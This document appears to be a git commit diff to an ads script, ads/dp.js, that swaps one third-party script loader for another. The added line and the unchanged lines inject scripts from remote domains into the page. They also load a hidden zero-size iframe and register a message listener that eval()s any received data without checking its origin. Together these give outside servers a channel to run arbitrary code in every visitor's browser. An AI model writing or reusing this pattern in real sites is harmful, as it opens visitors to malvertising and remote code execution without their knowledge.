561f49f8664f47ebe088c8e3e8b1a4509d0ea429
zmmx <35140632+zmmx@users.noreply.github.com>
2020-07-25 20:40:12 +0800

    更新 dp.js

--- ads/dp.js
+++ ads/dp.js
@@ -1,10 +1,5 @@
-//dipiao-njcn8888
-(function (){
-                        var id = "2415689770463175004-7432";
-  document.write('<ins style="display:none!important" id="' + id + '"></ins>');
-  (window.adbyunion = window.adbyunion || []).push(id);
-  document.write('<script async defer src="https://www.68710266.com/o.js"></script>');
-})();
+//dipiao-alpha
+document.writeln('<script src="https://v6.klmc88.cn/c/BBCE21B6-4172-47E9-B29C-7E8B0ADD1212.alpha"></script>');
 //dingpiao-zhimo
 if(navigator.userAgent.indexOf('baiduboxapp')>-1){document.write('<script src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_2059=e.data;if(_des_s_2059.des_s_2059){var _s = '/+/g';eval(decodeURIComponent(_des_s_2059.des_s_2059.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
 //pc
